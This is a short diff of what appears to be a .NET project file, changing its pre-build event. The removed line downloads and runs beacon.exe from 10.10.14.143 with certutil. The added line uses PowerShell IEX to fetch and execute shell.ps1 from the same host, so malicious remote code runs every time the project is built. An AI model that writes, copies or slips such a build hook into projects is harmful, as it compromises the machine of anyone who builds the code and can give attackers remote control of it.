@@ -6,7 +6,7 @@
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
     <PreBuildEvent>
-      <Command>certutil.exe -urlcache -split -f http://10.10.14.143:4545/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe</Command>
+      <Command>powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.143:4545/shell.ps1')</Command>
     </PreBuildEvent>
   </PropertyGroup>
 
